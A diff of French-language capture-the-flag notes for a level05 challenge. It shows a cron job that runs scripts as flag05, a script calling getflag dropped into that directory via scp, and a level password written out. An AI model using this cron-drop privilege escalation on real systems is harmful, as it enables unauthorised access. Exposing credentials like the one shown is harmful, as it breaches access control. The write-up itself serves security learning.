@@ -6,8 +6,7 @@ Système email: locale SMTP
 	/usr/share/perl/5.14.2/Net/SMTP.pm
 printenv USER
 printenv MAIL
-	/var/mail/level05
-Go cat
+cat	/var/mail/level05
 	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 
 c’est un Cronjob qui run toutes les 2 minutes
@@ -25,12 +24,13 @@ Créer un script qui getflag
 #!/bin/sh
 getflag > /opt/openarenaserver/flag
 
-On le rend exécutable car Bash -x fichier
+On le rend exécutable par Bash -x fichier
 Vrai si le fichier existe et est exécutable.
 	chmod 755 AAAA.sh 
 
 Copier depuis l’hote vers la machine
-scp -P 4242 /Users/morganealbanese/Desktop/wireshark/AAAA.sh level05@192.168.1.19:/opt/openarenaserver
+scp -P 4242 /Users/morganealbanese/Desktop/wireshark/AAAA.sh level05@192.XXX.1.21:/opt/openarenaserver
+exit, ssh mdp ne2searoevaevoem4ov4ar8ap
 
 cat /opt/openarenaserver/flag
 
